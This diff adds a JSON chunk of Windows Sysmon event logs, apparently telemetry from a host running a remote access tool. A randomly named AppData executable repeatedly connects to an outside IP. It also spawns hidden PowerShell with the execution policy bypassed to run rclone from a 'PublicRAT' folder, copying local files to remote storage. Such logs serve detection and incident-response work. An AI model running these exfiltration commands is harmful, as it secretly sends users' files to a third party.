@@ -1,0 +1,168 @@
+{
+  "metadata": {
+    "session_id": "20250717_200204",
+    "chunk_index": 259,
+    "chunk_size": 7,
+    "start_time": "2025-07-17T20:13:43.594Z",
+    "end_time": "2025-07-17T20:16:37.242Z"
+  },
+  "logs": [
+    {
+      "timestamp": "2025-07-17T20:13:43.594Z",
+      "event_type": "system",
+      "winlog": {
+        "event_id": "3",
+        "event_data": {
+          "DestinationIp": "147.185.221.22",
+          "DestinationPort": "24547",
+          "Image": "C:\\Users\\User\\AppData\\LocalfUWrSTPxgW.exe",
+          "ProcessGuid": "{FCBBCFF8-028F-6879-8E04-000000002900}",
+          "ProcessId": "5696",
+          "Protocol": "tcp",
+          "SourceIp": "192.168.31.105",
+          "SourcePort": "50918",
+          "User": "SOMETHING-GREAT\\User"
+        }
+      },
+      "host_id": "d87c364a",
+      "agent_id": "2a5146a5",
+      "session_id": "20250717_200204"
+    },
+    {
+      "timestamp": "2025-07-17T20:14:35.364Z",
+      "event_type": "system",
+      "winlog": {
+        "event_id": "1",
+        "event_data": {
+          "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -Command Start-Process -WindowStyle Hidden -FilePath \"C:\\PublicRAT\\rclone.exe\" -ArgumentList 'copy \"C:\\AiOLog.txt\" myStorage:/ --config \"C:\\PublicRAT\\rclone.conf\"'",
+          "Company": "Microsoft Corporation",
+          "Description": "Windows PowerShell",
+          "FileVersion": "10.0.26100.3323 (WinBuild.160101.0800)",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "LogonGuid": "{FCBBCFF8-0133-6879-0CDE-270000000000}",
+          "LogonId": "0x27de0c",
+          "OriginalFileName": "PowerShell.EXE",
+          "ParentImage": "C:\\Users\\User\\AppData\\LocalfUWrSTPxgW.exe",
+          "ParentUser": "SOMETHING-GREAT\\User",
+          "ProcessGuid": "{FCBBCFF8-054B-6879-4D0B-000000002900}",
+          "ProcessId": "20636",
+          "Product": "Microsoft® Windows® Operating System",
+          "User": "SOMETHING-GREAT\\User"
+        }
+      },
+      "host_id": "d87c364a",
+      "agent_id": "2a5146a5",
+      "session_id": "20250717_200204"
+    },
+    {
+      "timestamp": "2025-07-17T20:14:56.059Z",
+      "event_type": "system",
+      "winlog": {
+        "event_id": "3",
+        "event_data": {
+          "DestinationIp": "147.185.221.22",
+          "DestinationPort": "24547",
+          "Image": "C:\\Users\\User\\AppData\\LocalfUWrSTPxgW.exe",
+          "ProcessGuid": "{FCBBCFF8-028F-6879-8E04-000000002900}",
+          "ProcessId": "5696",
+          "Protocol": "tcp",
+          "SourceIp": "192.168.31.105",
+          "SourcePort": "51055",
+          "User": "SOMETHING-GREAT\\User"
+        }
+      },
+      "host_id": "d87c364a",
+      "agent_id": "2a5146a5",
+      "session_id": "20250717_200204"
+    },
+    {
+      "timestamp": "2025-07-17T20:14:56.151Z",
+      "event_type": "system",
+      "winlog": {
+        "event_id": "3",
+        "event_data": {
+          "DestinationIp": "147.185.221.22",
+          "DestinationPort": "24547",
+          "Image": "C:\\Users\\User\\AppData\\LocalfUWrSTPxgW.exe",
+          "ProcessGuid": "{FCBBCFF8-028F-6879-8E04-000000002900}",
+          "ProcessId": "5696",
+          "Protocol": "tcp",
+          "SourceIp": "192.168.31.105",
+          "SourcePort": "51055",
+          "User": "SOMETHING-GREAT\\User"
+        }
+      },
+      "host_id": "d87c364a",
+      "agent_id": "2a5146a5",
+      "session_id": "20250717_200204"
+    },
+    {
+      "timestamp": "2025-07-17T20:16:29.897Z",
+      "event_type": "system",
+      "winlog": {
+        "event_id": "3",
+        "event_data": {
+          "DestinationIp": "147.185.221.22",
+          "DestinationPort": "24547",
+          "Image": "C:\\Users\\User\\AppData\\LocalfUWrSTPxgW.exe",
+          "ProcessGuid": "{FCBBCFF8-028F-6879-8E04-000000002900}",
+          "ProcessId": "5696",
+          "Protocol": "tcp",
+          "SourceIp": "192.168.31.105",
+          "SourcePort": "51258",
+          "User": "SOMETHING-GREAT\\User"
+        }
+      },
+      "host_id": "d87c364a",
+      "agent_id": "2a5146a5",
+      "session_id": "20250717_200204"
+    },
+    {
+      "timestamp": "2025-07-17T20:16:29.960Z",
+      "event_type": "system",
+      "winlog": {
+        "event_id": "3",
+        "event_data": {
+          "DestinationIp": "147.185.221.22",
+          "DestinationPort": "24547",
+          "Image": "C:\\Users\\User\\AppData\\LocalfUWrSTPxgW.exe",
+          "ProcessGuid": "{FCBBCFF8-028F-6879-8E04-000000002900}",
+          "ProcessId": "5696",
+          "Protocol": "tcp",
+          "SourceIp": "192.168.31.105",
+          "SourcePort": "51258",
+          "User": "SOMETHING-GREAT\\User"
+        }
+      },
+      "host_id": "d87c364a",
+      "agent_id": "2a5146a5",
+      "session_id": "20250717_200204"
+    },
+    {
+      "timestamp": "2025-07-17T20:16:37.242Z",
+      "event_type": "system",
+      "winlog": {
+        "event_id": "1",
+        "event_data": {
+          "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -Command Start-Process -WindowStyle Hidden -FilePath \"C:\\PublicRAT\\rclone.exe\" -ArgumentList 'copy \"C:\\Users\\Public\\Documents\\desktop.ini\" myStorage:/ --config \"C:\\PublicRAT\\rclone.conf\"'",
+          "Company": "Microsoft Corporation",
+          "Description": "Windows PowerShell",
+          "FileVersion": "10.0.26100.3323 (WinBuild.160101.0800)",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "LogonGuid": "{FCBBCFF8-0133-6879-0CDE-270000000000}",
+          "LogonId": "0x27de0c",
+          "OriginalFileName": "PowerShell.EXE",
+          "ParentImage": "C:\\Users\\User\\AppData\\LocalfUWrSTPxgW.exe",
+          "ParentUser": "SOMETHING-GREAT\\User",
+          "ProcessGuid": "{FCBBCFF8-05C5-6879-E20B-000000002900}",
+          "ProcessId": "22308",
+          "Product": "Microsoft® Windows® Operating System",
+          "User": "SOMETHING-GREAT\\User"
+        }
+      },
+      "host_id": "d87c364a",
+      "agent_id": "2a5146a5",
+      "session_id": "20250717_200204"
+    }
+  ]
+}
